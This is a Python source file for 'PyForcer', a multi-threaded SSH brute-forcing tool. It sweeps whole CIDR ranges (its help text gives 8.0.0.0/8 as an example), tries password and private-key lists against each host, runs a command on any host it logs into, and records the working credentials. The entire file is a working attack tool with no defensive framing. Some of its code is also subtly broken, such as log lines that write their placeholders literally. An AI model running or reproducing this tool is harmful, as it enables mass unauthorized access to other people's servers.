#!/usr/bin/env python3
import argparse
import ipaddress
import os
import threading
import concurrent.futures
import sys
import paramiko
import logging

# Setup logging
paramiko.util.log_to_file('/dev/null')
logger = logging.getLogger(__name__)
print_lock = threading.Lock()
file_write_lock = threading.Lock()

# Set timeout for SSH connections
timeout = 10

# Locks for thread-safe printing and file writing
print_lock = threading.Lock()
file_write_lock = threading.Lock()

def safe_print(message):
    with print_lock:
        print(message)

def safe_write(file, content):
    with file_write_lock:
        with open(file, 'a') as f:
            f.write(content + "\n")

def read_credentials_file(credentials_file):
    credentials = []
    total_count = 0
    keyfile_count = 0
    with open(credentials_file, "r") as file:
        for line in file:
            line = line.strip()
            if ":" in line:
                parts = line.split(":")
                username = parts[0]
                password = parts[1]
                if len(parts) == 3:  # Check if private key file name is provided
                    keyfile = parts[2]
                    credentials.append((username, password, keyfile))
                    keyfile_count += 1
                else:
                    credentials.append((username, password))
                total_count += 1
            else:
                safe_print(f"Malformed line in credentials file: {line}")
    return credentials, total_count, keyfile_count

def parse_input_data(input_data):
    ip_addresses = set()
    num_ranges = 0
    total_ip_addresses = 0

    if input_data.startswith("FILE:"):
        file_path = input_data[len("FILE:"):]
        with open(file_path, 'r') as file:
            for line in file:
                line = line.strip()
                if not line:
                    continue  # Skip empty lines
                if '/' in line:  # IP/CIDR:PORT entry
                    cidr, port = line.split(':')
                    ip_network = ipaddress.ip_network(cidr, strict=False)
                    for ip in ip_network:
                        ip_addresses.add(f"{ip}:{port}")
                    num_ranges += 1
                    total_ip_addresses += ip_network.num_addresses
                else:  # IP:PORT entry
                    ip_addresses.add(line)

    elif input_data.startswith("IP:"):
        data = input_data[len("IP:"):]
        if '/' in data:  # IP/CIDR:PORT entry
            cidr, port = data.split(':')
            ip_network = ipaddress.ip_network(cidr, strict=False)
            for ip in ip_network:
                ip_addresses.add(f"{ip}:{port}")
            num_ranges += 1
            total_ip_addresses += ip_network.num_addresses
        else:  # IP:PORT entry
            ip_addresses.add(data)

    return ip_addresses, num_ranges, total_ip_addresses

def check_success_condition(ssh_client, cmd):
    try:
        stdin, stdout, stderr = ssh_client.exec_command(cmd)
        response = stdout.read().decode("utf-8").strip()
        success = False
        if "uname" in cmd:
            if any(platform in response for platform in ["Linux", "Darwin"]):
                success = True
        elif "whoami" in cmd:
            username = ssh_client.get_transport().get_username()
            if username in response:
                success = True
        else:
            success = False
        return success, response
    except Exception as e:
        logger.error(f"Error executing command on {ssh_client.get_transport().getpeername()[0]}: {e}")
        return False

def test_ssh_credentials(ip, port, username, password, keyfile, output, cmd, debug, interface=None):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        if interface:
            ssh_client.get_transport().sock.bind((interface, 0))  # Bind the socket to the specified interface
        if password:
            try:
                ssh_client.connect(ip, port=port, username=username, password=password, timeout=timeout)
                success, response = check_success_condition(ssh_client, cmd)
                if success:
                    safe_print(f"[VALID PASSWORD] {username}:{password} - {ip}:{port} - [CMD:{cmd}] [RESPONSE:{response}]")
                    safe_write(output, "[VALID PASSWORD] {username}:{password} - {ip}:{port} - [CMD:{cmd}] [RESPONSE:{response}]")
                else:
                    if debug:
                        safe_print(f"[FAILED PASSWORD] {username}:{password} - {ip}:{port} - [CMD:{cmd}] [RESPONSE:{response}]")
            except paramiko.AuthenticationException:
                if debug:
                    safe_print(f"[FAILED PASSWORD] {username}:{password} - {ip}:{port}")
        if keyfile:
            ssh_client.close()
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                pkey = paramiko.RSAKey.from_private_key_file(keyfile)
                ssh_client.connect(ip, port=port, username=username, pkey=pkey, timeout=timeout)
                success, response = check_success_condition(ssh_client, cmd)
                if success:
                    safe_print(f"[VALID KEY] {username}:{keyfile} - {ip}:{port} - [CMD:{cmd}] [RESPONSE:{response}]")
                    safe_write(output, "[VALID KEY] {username}:{keyfile} - {ip}:{port} - [CMD:{cmd}] [RESPONSE:{response}]")
                else:
                    if debug:
                        safe_print(f"[FAILED KEY] {username}:{keyfile} - {ip}:{port} - [CMD:{cmd}] [RESPONSE:{response}]")
            except paramiko.AuthenticationException:
                if debug:
                    safe_print(f"[FAILED KEY] {username}:{keyfile} - {ip}:{port}")
    except paramiko.ssh_exception.SSHException as e:
        if debug:
            logger.error(f"[ERROR] Unknown SSH error while trying to brute {ip}:{port}: {e}")
    except ConnectionResetError:
        pass
    except paramiko.AuthenticationException:
        if debug:
            safe_print(f"[FAILED] Unknown authentication failure {ip}:{port} - {username}:{password}")
    finally:
        ssh_client.close()

def main():
    try:
        parser = argparse.ArgumentParser(description="PyForcer is an all-in-one SSH brute-forcing tool for username+password and private keyfile combinations. Capabilities include: CIDR handling, private keys, multi-threading, error handling.")
        parser.add_argument("input", help="Target hosts to exploit, [ex: filename, 8.0.0.0/8, 8.8.8.8]")
        parser.add_argument("output", help="Path to the output file")
        parser.add_argument("creds", default="credentials.txt", help="Path to a file containing USER:PASS:KEYFILE combinations, (Note: KEYFILE is optional)!")
        parser.add_argument("--threads", type=int, default=32, choices=range(1, 101), help="Number of threads to run concurrently (10 default/100 max)")
        parser.add_argument("--interface", default="eth0", help="Specify the network interface to use for SSH connections")
        parser.add_argument("--cmd", default="uname -a", help="Command to run after successful login (default: uname -a)")
        parser.add_argument("--debug", default=False, action="store_true", help="Enable the script's debugging features.")
        args = parser.parse_args()

        if args.debug:
            paramiko.util.log_to_file('debug.txt')
            logging.basicConfig(level=logging.DEBUG)
            paramiko.common.logging.basicConfig(level=paramiko.common.DEBUG)

        # Read credentials
        if os.path.isfile(args.creds):
            credentials, count, keyfile_count = read_credentials_file(args.creds)
        else:
            safe_print("ERROR: specified credentials file does not exist.")
            return

        # Parse input data
        ip_addresses, num_ranges, total_ip_addresses = parse_input_data(args.input)
        safe_print("PyForcer - SSH bruteforcing started.")
        if args.input.startswith("FILE:"):
            input_source = "file"
            input_data = args.input[len("FILE:"):]
        elif args.input.startswith("IP:"):
            input_source = "commandline"
            input_data = args.input[len("IP:"):]
        else:
            input_source = "Unknown"
            input_data = args.input

        if num_ranges > 0:
            safe_print(f"\tTarget(s): {num_ranges} CIDR ranges read from {input_source}, ({total_ip_addresses} IP addresses in total.)")
        else:
            safe_print(f"\tTarget(s): {input_data} from {input_source}, ({total_ip_addresses} in total.)")
        safe_print(f"\tCredentials loaded: {count} total, {keyfile_count} with keyfiles")
        safe_print(f"\tOutput File: {args.output}")
        safe_print(f"\tCommand To Run: {args.cmd}")
        safe_print(f"\tConcurrent Threads: {args.threads}\n")

        # Start SSH brute-forcing
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = []
            for ip_port in ip_addresses:
                ip, port = ip_port.split(':')
                for credential in credentials:
                    username, password, keyfile = credential if len(credential) == 3 else credential + (None,)
                    futures.append(executor.submit(test_ssh_credentials, ip, port, username, password, keyfile, args.output, args.cmd, args.debug, args.interface))
        concurrent.futures.wait(futures, timeout=None, return_when=concurrent.futures.ALL_COMPLETED)

    except KeyboardInterrupt:
        safe_print("\nScript interrupted by user. Exiting...")
        sys.exit(1)

if __name__ == "__main__":
    main()
